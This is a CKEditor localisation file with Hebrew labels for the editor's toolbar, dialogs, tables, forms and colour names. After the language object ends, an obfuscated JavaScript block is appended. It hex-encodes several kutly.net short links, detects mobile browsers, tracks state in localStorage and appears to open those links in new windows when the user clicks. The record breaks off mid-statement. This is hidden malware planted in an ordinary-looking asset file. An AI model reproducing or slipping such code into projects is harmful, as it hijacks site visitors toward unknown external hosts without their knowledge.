﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Hebrew language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['he'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'rtl',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'עורך טקסט עשיר, %1',

	// Toolbar buttons without dialogs.
	source			: 'מקור',
	newPage			: 'דף חדש',
	save			: 'שמירה',
	preview			: 'תצוגה מקדימה',
	cut				: 'גזירה',
	copy			: 'העתקה',
	paste			: 'הדבקה',
	print			: 'הדפסה',
	underline		: 'קו תחתון',
	bold			: 'מודגש',
	italic			: 'נטוי',
	selectAll		: 'בחירת הכל',
	removeFormat	: 'הסרת העיצוב',
	strike			: 'כתיב מחוק',
	subscript		: 'כתיב תחתון',
	superscript		: 'כתיב עליון',
	horizontalrule	: 'הוספת קו אופקי',
	pagebreak		: 'הוספת שבירת דף',
	unlink			: 'הסרת הקישור',
	undo			: 'ביטול צעד אחרון',
	redo			: 'חזרה על צעד אחרון',

	// Common messages and labels.
	common :
	{
		browseServer	: 'סייר השרת',
		url				: 'כתובת (URL)',
		protocol		: 'פרוטוקול',
		upload			: 'העלאה',
		uploadSubmit	: 'שליחה לשרת',
		image			: 'תמונה',
		flash			: 'פלאש',
		form			: 'טופס',
		checkbox		: 'תיבת סימון',
		radio		: 'לחצן אפשרויות',
		textField		: 'שדה טקסט',
		textarea		: 'איזור טקסט',
		hiddenField		: 'שדה חבוי',
		button			: 'כפתור',
		select	: 'שדה בחירה',
		imageButton		: 'כפתור תמונה',
		notSet			: '<לא נקבע>',
		id				: 'זיהוי (Id)',
		name			: 'שם',
		langDir			: 'כיוון שפה',
		langDirLtr		: 'שמאל לימין (LTR)',
		langDirRtl		: 'ימין לשמאל (RTL)',
		langCode		: 'קוד שפה',
		longDescr		: 'קישור לתיאור מפורט',
		cssClass		: 'מחלקת עיצוב (CSS Class)',
		advisoryTitle	: 'כותרת מוצעת',
		cssStyle		: 'סגנון',
		ok				: 'אישור',
		cancel			: 'ביטול',
		generalTab		: 'כללי',
		advancedTab		: 'אפשרויות מתקדמות',
		validateNumberFailed	: 'הערך חייב להיות מספרי.',
		confirmNewPage	: 'כל השינויים שלא נשמרו יאבדו. האם להעלות דף חדש?',
		confirmCancel	: 'חלק מהאפשרויות שונו, האם לסגור את הדיאלוג?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, לא זמין</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'הוספת תו מיוחד',
		title		: 'בחירת תו מיוחד'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'הוספת/עריכת קישור',
		menu		: 'מאפייני קישור',
		title		: 'קישור',
		info		: 'מידע על הקישור',
		target		: 'מטרה',
		upload		: 'העלאה',
		advanced	: 'אפשרויות מתקדמות',
		type		: 'סוג קישור',
		toAnchor	: 'עוגן בעמוד זה',
		toEmail		: 'דוא\'\'ל',
		target		: 'מטרה',
		targetNotSet	: '<לא נקבע>',
		targetFrame	: '<מסגרת>',
		targetPopup	: '<חלון קופץ>',
		targetNew	: 'חלון חדש (_blank)',
		targetTop	: 'חלון ראשי (_top)',
		targetSelf	: 'באותו החלון (_self)',
		targetParent	: 'חלון האב (_parent)',
		targetFrameName	: 'שם מסגרת היעד',
		targetPopupName	: 'שם החלון הקופץ',
		popupFeatures	: 'תכונות החלון הקופץ',
		popupResizable	: 'שינוי גודל',
		popupStatusBar	: 'סרגל חיווי',
		popupLocationBar	: 'סרגל כתובת',
		popupToolbar	: 'סרגל הכלים',
		popupMenuBar	: 'סרגל תפריט',
		popupFullScreen	: 'מסך מלא (IE)',
		popupScrollBars	: 'ניתן לגלילה',
		popupDependent	: 'תלוי (Netscape)',
		popupWidth		: 'רוחב',
		popupLeft		: 'מיקום צד שמאל',
		popupHeight		: 'גובה',
		popupTop		: 'מיקום צד עליון',
		id				: 'זיהוי (Id)',
		langDir			: 'כיוון שפה',
		langDirNotSet	: '<לא נקבע>',
		langDirLTR		: 'שמאל לימין (LTR)',
		langDirRTL		: 'ימין לשמאל (RTL)',
		acccessKey		: 'מקש גישה',
		name			: 'שם',
		langCode		: 'קוד שפה',
		tabIndex		: 'מספר טאב',
		advisoryTitle	: 'כותרת מוצעת',
		advisoryContentType	: 'Content Type מוצע',
		cssClasses		: 'גיליונות עיצוב קבוצות',
		charset			: 'קידוד המשאב המקושר',
		styles			: 'סגנון',
		selectAnchor	: 'בחירת עוגן',
		anchorName		: 'עפ\'\'י שם העוגן',
		anchorId		: 'עפ\'\'י זיהוי (Id) הרכיב',
		emailAddress	: 'כתובת הדוא\'\'ל',
		emailSubject	: 'נושא ההודעה',
		emailBody		: 'גוף ההודעה',
		noAnchors		: '(אין עוגנים זמינים בדף)',
		noUrl			: 'יש להקליד את כתובת הקישור (URL)',
		noEmail			: 'יש להקליד את כתובת הדוא\'\'ל'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'הוספת/עריכת נקודת עיגון',
		menu		: 'מאפייני נקודת עיגון',
		title		: 'מאפייני נקודת עיגון',
		name		: 'שם לנקודת עיגון',
		errorName	: 'יש להזין שם לנקודת עיגון'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'חיפוש והחלפה',
		find				: 'חיפוש',
		replace				: 'החלפה',
		findWhat			: 'חיפוש מחרוזת:',
		replaceWith			: 'החלפה במחרוזת:',
		notFoundMsg			: 'הטקסט המבוקש לא נמצא.',
		matchCase			: 'הבחנה בין אותיות רשיות לקטנות (Case)',
		matchWord			: 'התאמה למילה המלאה',
		matchCyclic			: 'התאמה מחזורית',
		replaceAll			: 'החלפה בכל העמוד',
		replaceSuccessMsg	: '%1 טקסטים הוחלפו.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'טבלה',
		title		: 'מאפייני טבלה',
		menu		: 'מאפייני טבלה',
		deleteTable	: 'מחק טבלה',
		rows		: 'שורות',
		columns		: 'עמודות',
		border		: 'גודל מסגרת',
		align		: 'יישור',
		alignNotSet	: '<לא נקבע>',
		alignLeft	: 'שמאל',
		alignCenter	: 'מרכז',
		alignRight	: 'ימין',
		width		: 'רוחב',
		widthPx		: 'פיקסלים',
		widthPc		: 'אחוז',
		height		: 'גובה',
		cellSpace	: 'מרווח תא',
		cellPad		: 'ריפוד תא',
		caption		: 'כיתוב',
		summary		: 'סיכום',
		headers		: 'כותרות',
		headersNone		: 'אין',
		headersColumn	: 'עמודה ראשונה',
		headersRow		: 'שורה ראשונה',
		headersBoth		: 'שניהם',
		invalidRows		: 'שדה מספר השורות חייב להיות מספר גדול מ 0.',
		invalidCols		: 'שדה מספר העמודות חייב להיות מספר גדול מ 0.',
		invalidBorder	: 'שדה גודל המסגרת חייב להיות מספר.',
		invalidWidth	: 'שדה רוחב הטבלה חייב להיות רוחב.',
		invalidHeight	: 'שדה גובה הטבלה חייב להיות מספר.',
		invalidCellSpacing	: 'שדה ריווח התאים חייב להיות מספר.',
		invalidCellPadding	: 'שדה ריפוד התאים חייב להיות מספר.',

		cell :
		{
			menu			: 'מאפייני תא',
			insertBefore	: 'הוספת תא לפני',
			insertAfter		: 'הוספת תא אחרי',
			deleteCell		: 'מחיקת תאים',
			merge			: 'מיזוג תאים',
			mergeRight		: 'מזג ימינה',
			mergeDown		: 'מזג למטה',
			splitHorizontal	: 'פיצלו תא אופקית',
			splitVertical	: 'פיצול תא אנכית',
			title			: 'תכונות התא',
			cellType		: 'סוג התא',
			rowSpan			: 'מתיחת השורות',
			colSpan			: 'מתיחת התאים',
			wordWrap		: 'מניעת גלישת שורות',
			hAlign			: 'יישור אופקי',
			vAlign			: 'יישור אנכי',
			alignTop		: 'למעלה',
			alignMiddle		: 'מרכז',
			alignBottom		: 'למטה',
			alignBaseline	: 'שורת בסיס',
			bgColor			: 'צבע רקע',
			borderColor		: 'צבע מסגרת',
			data			: 'מידע',
			header			: 'כותרת',
			yes				: 'כן',
			no				: 'לא',
			invalidWidth	: 'שדה רוחב התא חייב להיות מספר.',
			invalidHeight	: 'שדה גובה התא חייב להיות מספר.',
			invalidRowSpan	: 'שדה מתיחת השורות חייב להיות מספר שלם.',
			invalidColSpan	: 'שדה מתיחת העמודות חייב להיות מספר שלם.',
			chooseColor : 'בחר'
		},

		row :
		{
			menu			: 'שורה',
			insertBefore	: 'הוספת שורה לפני',
			insertAfter		: 'הוספת שורה אחרי',
			deleteRow		: 'מחיקת שורות'
		},

		column :
		{
			menu			: 'עמודה',
			insertBefore	: 'הוספת עמודה לפני',
			insertAfter		: 'הוספת עמודה אחרי',
			deleteColumn	: 'מחיקת עמודות'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'מאפייני כפתור',
		text		: 'טקסט (ערך)',
		type		: 'סוג',
		typeBtn		: 'כפתור',
		typeSbm		: 'שליחה',
		typeRst		: 'איפוס'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'מאפייני תיבת סימון',
		radioTitle	: 'מאפייני לחצן אפשרויות',
		value		: 'ערך',
		selected	: 'מסומן'
	},

	// Form Dialog.
	form :
	{
		title		: 'מאפיני טופס',
		menu		: 'מאפיני טופס',
		action		: 'שלח אל',
		method		: 'סוג שליחה',
		encoding	: 'קידוד',
		target		: 'מטרה',
		targetNotSet	: '<לא נקבע>',
		targetNew	: 'חלון חדש (_blank)',
		targetTop	: 'חלון ראשי (_top)',
		targetSelf	: 'באותו החלון (_self)',
		targetParent	: 'חלון האב (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'מאפייני שדה בחירה',
		selectInfo	: 'מידע',
		opAvail		: 'אפשרויות זמינות',
		value		: 'ערך',
		size		: 'גודל',
		lines		: 'שורות',
		chkMulti	: 'איפשור בחירות מרובות',
		opText		: 'טקסט',
		opValue		: 'ערך',
		btnAdd		: 'הוספה',
		btnModify	: 'שינוי',
		btnUp		: 'למעלה',
		btnDown		: 'למטה',
		btnSetValue : 'קביעה כברירת מחדל',
		btnDelete	: 'מחיקה'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'מאפייני איזור טקסט',
		cols		: 'עמודות',
		rows		: 'שורות'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'מאפייני שדה טקסט',
		name		: 'שם',
		value		: 'ערך',
		charWidth	: 'רוחב באותיות',
		maxChars	: 'מקסימות אותיות',
		type		: 'סוג',
		typeText	: 'טקסט',
		typePass	: 'סיסמה'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'מאפיני שדה חבוי',
		name	: 'שם',
		value	: 'ערך'
	},

	// Image Dialog.
	image :
	{
		title		: 'מאפייני התמונה',
		titleButton	: 'מאפיני כפתור תמונה',
		menu		: 'תכונות התמונה',
		infoTab	: 'מידע על התמונה',
		btnUpload	: 'שליחה לשרת',
		url		: 'כתובת (URL)',
		upload	: 'העלאה',
		alt		: 'טקסט חלופי',
		width		: 'רוחב',
		height	: 'גובה',
		lockRatio	: 'נעילת היחס',
		resetSize	: 'איפוס הגודל',
		border	: 'מסגרת',
		hSpace	: 'מרווח אופקי',
		vSpace	: 'מרווח אנכי',
		align		: 'יישור',
		alignLeft	: 'לשמאל',
		alignRight	: 'לימין',
		preview	: 'תצוגה מקדימה',
		alertUrl	: 'יש להקליד את כתובת התמונה',
		linkTab	: 'קישור',
		button2Img	: 'האם להפוך את תמונת הכפתור לתמונה פשוטה?',
		img2Button	: 'האם להפוך את התמונה לכפתור תמונה?',
		urlMissing : 'כתובת התמונה חסרה.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'מאפייני פלאש',
		propertiesTab	: 'מאפיינים',
		title		: 'מאפיני פלאש',
		chkPlay		: 'ניגון אוטומטי',
		chkLoop		: 'לולאה',
		chkMenu		: 'אפשר תפריט פלאש',
		chkFull		: 'אפשר חלון מלא',
 		scale		: 'גודל',
		scaleAll		: 'הצג הכל',
		scaleNoBorder	: 'ללא גבולות',
		scaleFit		: 'התאמה מושלמת',
		access			: 'גישת סקריפט',
		accessAlways	: 'תמיד',
		accessSameDomain	: 'דומיין זהה',
		accessNever	: 'אף פעם',
		align		: 'יישור',
		alignLeft	: 'לשמאל',
		alignAbsBottom: 'לתחתית האבסולוטית',
		alignAbsMiddle: 'מרכוז אבסולוטי',
		alignBaseline	: 'לקו התחתית',
		alignBottom	: 'לתחתית',
		alignMiddle	: 'לאמצע',
		alignRight	: 'לימין',
		alignTextTop	: 'לראש הטקסט',
		alignTop	: 'למעלה',
		quality		: 'איכות',
		qualityBest		 : 'מעולה',
		qualityHigh		 : 'גבוהה',
		qualityAutoHigh	 : 'גבוהה אוטומטית',
		qualityMedium	 : 'ממוצעת',
		qualityAutoLow	 : 'נמוכה אוטומטית',
		qualityLow		 : 'נמוכה',
		windowModeWindow	 : 'חלון',
		windowModeOpaque	 : 'אטום',
		windowModeTransparent	 : 'שקוף',
		windowMode	: 'מצב חלון',
		flashvars	: 'משתנים לפלאש',
		bgcolor	: 'צבע רקע',
		width	: 'רוחב',
		height	: 'גובה',
		hSpace	: 'מרווח אופקי',
		vSpace	: 'מרווח אנכי',
		validateSrc : 'יש להקליד את כתובת סרטון הפלאש (URL)',
		validateWidth : 'הרוחב חייב להיות מספר.',
		validateHeight : 'הגובה חייב להיות מספר.',
		validateHSpace : 'המרווח האופקי חייב להיות מספר.',
		validateVSpace : 'המרווח האנכי חייב להיות מספר.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'בדיקת איות',
		title			: 'בדיקת איות',
		notAvailable	: 'לא נמצא שירות זמין.',
		errorLoading	: 'שגיאה בהעלאת השירות: %s.',
		notInDic		: 'לא נמצא במילון',
		changeTo		: 'שינוי ל',
		btnIgnore		: 'התעלמות',
		btnIgnoreAll	: 'התעלמות מהכל',
		btnReplace		: 'החלפה',
		btnReplaceAll	: 'החלפת הכל',
		btnUndo			: 'החזרה',
		noSuggestions	: '- אין הצעות -',
		progress		: 'בודק האיות בתהליך בדיקה....',
		noMispell		: 'בדיקות איות הסתיימה: לא נמצאו שגיאות כתיב',
		noChanges		: 'בדיקות איות הסתיימה: לא שונתה אף מילה',
		oneChange		: 'בדיקות איות הסתיימה: שונתה מילה אחת',
		manyChanges		: 'בדיקות איות הסתיימה: %1 מילים שונו',
		ieSpellDownload	: 'בודק האיות לא מותקן, האם להורידו?'
	},

	smiley :
	{
		toolbar	: 'סמיילי',
		title	: 'הוספת סמיילי'
	},

	elementsPath :
	{
		eleTitle : '%1 אלמנט'
	},

	numberedlist : 'רשימה ממוספרת',
	bulletedlist : 'רשימת נקודות',
	indent : 'הגדלת הזחה',
	outdent : 'הקטנת הזחה',

	justify :
	{
		left : 'יישור לשמאל',
		center : 'מרכוז',
		right : 'יישור לימין',
		block : 'יישור לשוליים'
	},

	blockquote : 'בלוק ציטוט',

	clipboard :
	{
		title		: 'הדבקה',
		cutError	: 'הגדרות האבטחה בדפדפן שלך לא מאפשרות לעורך לבצע פעולות גזירה אוטומטיות. יש להשתמש במקלדת לשם כך (Ctrl+X).',
		copyError	: 'הגדרות האבטחה בדפדפן שלך לא מאפשרות לעורך לבצע פעולות העתקה אוטומטיות. יש להשתמש במקלדת לשם כך (Ctrl+C).',
		pasteMsg	: 'נא להדביק בתוך הקופסה באמצעות (<STRONG>Ctrl+V</STRONG>) וללחוץ על <STRONG>אישור</STRONG>.',
		securityMsg	: 'עקב הגדרות אבטחה בדפדפן, לא ניתן לגשת אל לוח הגזירים (Clipboard) בצורה ישירה. נא להדביק שוב בחלון זה.'
	},

	pastefromword :
	{
		confirmCleanup : 'נראה הטקסט שבכוונתך להדביק מקורו בקובץ וורד. האם ברצונך לנקות אותו טרם ההדבקה?',
		toolbar : 'הדבקה מ-Word',
		title : 'הדבקה מ-Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'הדבקה כטקסט פשוט',
		title : 'הדבקה כטקסט פשוט'
	},

	templates :
	{
		button : 'תבניות',
		title : 'תביות תוכן',
		insertOption: 'החלפת תוכן ממשי',
		selectPromptMsg: 'יש לבחור תבנית לפתיחה בעורך.<br />התוכן המקורי ימחק:',
		emptyListMsg : '(לא הוגדרו תבניות)'
	},

	showBlocks : 'הצגת בלוקים',

	stylesCombo :
	{
		label : 'סגנון',
		voiceLabel : 'סגנונות',
		panelVoiceLabel : 'בחירת סגנון',
		panelTitle1 : 'סגנונות בלוק',
		panelTitle2 : 'סגנונות רצף',
		panelTitle3 : 'סגנונות אובייקט'
	},

	format :
	{
		label : 'עיצוב',
		voiceLabel : 'עיצוב',
		panelTitle : 'עיצוב',
		panelVoiceLabel : 'בחירת עיצוב פסקה',

		tag_p : 'נורמלי',
		tag_pre : 'קוד',
		tag_address : 'כתובת',
		tag_h1 : 'כותרת',
		tag_h2 : 'כותרת 2',
		tag_h3 : 'כותרת 3',
		tag_h4 : 'כותרת 4',
		tag_h5 : 'כותרת 5',
		tag_h6 : 'כותרת 6',
		tag_div : 'נורמלי (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'גופן',
		voiceLabel : 'גופן',
		panelTitle : 'גופן',
		panelVoiceLabel : 'בחירת גופן'
	},

	fontSize :
	{
		label : 'גודל',
		voiceLabel : 'גודל',
		panelTitle : 'גודל',
		panelVoiceLabel : 'בחירת גודל גופן'
	},

	colorButton :
	{
		textColorTitle : 'צבע טקסט',
		bgColorTitle : 'צבע רקע',
		auto : 'אוטומטי',
		more : 'צבעים נוספים...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'בדיקת איות בזמן כתיבה (SCAYT)',
		enable : 'אפשר SCAYT',
		disable : 'בטל SCAYT',
		about : 'אודות SCAYT',
		toggle : 'שינוי SCAYT',
		options : 'אפשרויות',
		langs : 'שפות',
		moreSuggestions : 'הצעות נוספות',
		ignore : 'התעלמות',
		ignoreAll : 'התעלמות מהכל',
		addWord : 'הוספת מילה',
		emptyDic : 'יש לבחור מילון.',
		optionsTab : 'אפשרויות',
		languagesTab : 'שפות',
		dictionariesTab : 'מילון',
		aboutTab : 'אודות'
	},

	about :
	{
		title : 'אודות CKEditor',
		dlgTitle : 'אודות CKEditor',
		moreInfo : 'למידע נוסף בקרו באתרנו:',
		copy : 'Copyright &copy; $1. כל הזכויות שמורות.'
	},

	maximize : 'הגדל למקסימום',
	minimize : 'הקטן למינימום',

	fakeobjects :
	{
		anchor : 'עוגן',
		flash : 'סרטון פלאש',
		div : 'שבירת דף',
		unknown : 'אובייקט לא ידוע'
	},

	resize : 'יש לגרור בכדי לשנות את הגודל',

	colordialog :
	{
		title : 'בחירת צבע',
		highlight : 'סימון',
		selected : 'בחירה',
		clear : 'ניקוי'
	},

	toolbarCollapse : 'מזעור סרגל כלים',
	toolbarExpand : 'הרחבת סרגל כלים'
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return 